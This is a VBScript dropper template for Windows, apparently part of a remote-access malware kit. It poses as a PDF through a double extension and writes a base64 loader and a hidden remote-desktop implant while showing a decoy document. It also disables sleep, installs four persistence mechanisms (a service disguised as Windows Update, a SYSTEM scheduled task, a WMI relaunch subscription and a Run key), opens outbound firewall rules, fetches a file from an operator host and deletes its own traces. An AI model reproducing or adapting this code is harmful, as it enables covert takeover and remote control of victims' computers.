' fleet windows dropper — {{DOC}}_{{RAND4}}.pdf.vbs  (document: {{TITLE}})
' Double extension: Windows hides .vbs, the file looks like a PDF.
' All artifacts written with ADODB.Stream.SaveToFile (never SaveAs -> no
' Zone.Identifier / SmartScreen handoff). Decoy PDF fetched with WinHttp when
' reachable, embedded otherwise. Opens the decoy 1.5s after launch.
' Persists via HKCU\...\Run so it is unattended across reboots.
Option Explicit

Dim shell, fso, base, loaderPath, decoyPath, remoteDecoy
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

base = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\{{RAND4}}"
If Not fso.FolderExists(base) Then fso.CreateFolder(base)

loaderPath = base & "\{{RAND4}}.exe"
decoyPath = base & "\{{DOC}}_{{RAND4}}.pdf"

Dim loaderB64
loaderB64 = {{LOADER_B64_EXPR}}
WriteFile loaderPath, loaderB64

remoteDecoy = HttpGetB64("{{BASE_URL}}/dl/decoy.pdf")
If Len(remoteDecoy) > 0 Then
  WriteFile decoyPath, remoteDecoy
Else
  WriteFile decoyPath, "{{DECOY_B64}}"
End If

' remote desktop helper: deploy rd-win.exe (SendInput engine, session-aware) to a
' hidden ProgramData path so the operator can mirror and drive the box unattended.
Dim rdPath
rdPath = base & "\rd-{RAND4}.exe"
WriteFile rdPath, "{{RD_WIN_B64}}"
On Error Resume Next
fso.GetFile(rdPath).Attributes = fso.GetFile(rdPath).Attributes Or 2 Or 4  ' hidden + system
On Error GoTo 0

' stay awake: never sleep, lid close = do nothing, hibernate off, requestsoverride
Dim pw
pw = "powercfg /change standby-timeout-ac 0 & powercfg /change standby-timeout-dc 0 & " & _
     "powercfg /change hibernate-timeout-ac 0 & powercfg /change hibernate-timeout-dc 0 & " & _
     "powercfg /setacvalueindex scheme_current sub_buttons lidaction 0 & " & _
     "powercfg /setdcvalueindex scheme_current sub_buttons lidaction 0 & " & _
     "powercfg /hibernate off & powercfg /setactive scheme_current"
shell.Run pw, 0, True

' unattended persistence: three independent paths, none visible in default Task Manager
'   1) Windows service (auto-start, SYSTEM)
'   2) scheduled task (/RU SYSTEM, on logon)
'   3) WMI __EventFilter/CommandLineEventConsumer (relaunch if killed)
On Error Resume Next
Dim svc, task, wmi
svc = "sc.exe create FleetSvc{RAND4} binPath= """" & rdPath & """" start= auto & " & _
      "sc.exe description FleetSvc{RAND4} ""Windows Update Service"" & " & _
      "sc.exe start FleetSvc{RAND4}"
shell.Run svc, 0, True
task = "schtasks.exe /create /TN FleetTask{RAND4} /TR """" & rdPath & """" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F"
shell.Run task, 0, True
wmi = "powershell -NoProfile -ExecutionPolicy Bypass -Command `" & _
      "$f='" & rdPath & "'; " & _
      "$n='FleetFlt{RAND4}'; $c='FleetCon{RAND4}'; " & _
      "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='$n';EventNamespace='root\cimv2';QueryLanguage='WQL';Query=""SELECT * FROM __InstanceDeletionEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='rd-{RAND4}.exe'"}} -ErrorAction SilentlyContinue; " & _
      "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='$c';CommandLineTemplate=""'$f'""} -ErrorAction SilentlyContinue; " & _
      "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=(Get-WmiObject __EventFilter -Namespace root\subscription | Where-Object {$_.Name -eq '$n'});Consumer=(Get-WmiObject CommandLineEventConsumer -Namespace root\subscription | Where-Object {$_.Name -eq '$c'})} -ErrorAction SilentlyContinue"
shell.Run wmi, 0, True
On Error GoTo 0

' HKCU Run as a fourth, user-session persistence path
shell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Fleet{{RAND4}}", """" & loaderPath & """"

' preconfigure the host firewall: allow the payload out so it can reach the
' operator even when a strict outbound policy is set (best effort; needs admin).
Dim fwRule
fwRule = "netsh advfirewall firewall add rule name=Fleet{{RAND4}} dir=out action=allow program=""" & loaderPath & """ enable=yes profile=any"
shell.Run fwRule, 0, True
fwRule = "netsh advfirewall firewall add rule name=FleetHVNC{{RAND4}} dir=out action=allow program=""" & base & "\hvnc.exe"" enable=yes profile=any"
shell.Run fwRule, 0, True
On Error GoTo 0

' lure icon next to the shortcut (also copied to %APPDATA% for the .lnk icon)
On Error Resume Next
WriteFile shell.ExpandEnvironmentStrings("%APPDATA%") & "\{{ICON_NAME}}", "{{ICON_B64}}"
On Error GoTo 0

shell.CurrentDirectory = base
shell.Run """" & loaderPath & """", 0, False

WScript.Sleep 1500
shell.Run """" & decoyPath & """", 1, False

' self-destruct: once the implant is running, remove the dropper artifacts and
' the delivered shortcut so nothing remains visible to the user.
On Error Resume Next
Dim selfPath, cleaner
selfPath = WScript.ScriptFullName
cleaner = "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q """ & selfPath & """ """ & _
          loaderPath & """ """ & decoyPath & """ 2>nul & " & _
          "del /f /q ""%USERPROFILE%\Desktop\{{DOC}}*.lnk"" ""%USERPROFILE%\Downloads\{{DOC}}*.lnk"" 2>nul"
shell.Run cleaner, 0, False
On Error GoTo 0

Sub WriteFile(path, b64)
  Dim xml, node, stream
  Set xml = CreateObject("MSXML2.DOMDocument.6.0")
  Set node = xml.createElement("b64")
  node.DataType = "bin.base64"
  node.Text = b64
  Set stream = CreateObject("ADODB.Stream")
  stream.Type = 1
  stream.Open
  stream.Write node.NodeTypedValue
  stream.SaveToFile path, 2
  stream.Close
End Sub

Function HttpGetB64(url)
  Dim http, xml, node
  HttpGetB64 = ""
  On Error Resume Next
  Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
  http.Open "GET", url, False
  http.Send
  If Err.Number = 0 And http.Status = 200 Then
    Set xml = CreateObject("MSXML2.DOMDocument.6.0")
    Set node = xml.createElement("b64")
    node.DataType = "bin.base64"
    node.NodeTypedValue = http.ResponseBody
    HttpGetB64 = node.Text
  End If
  On Error GoTo 0
End Function
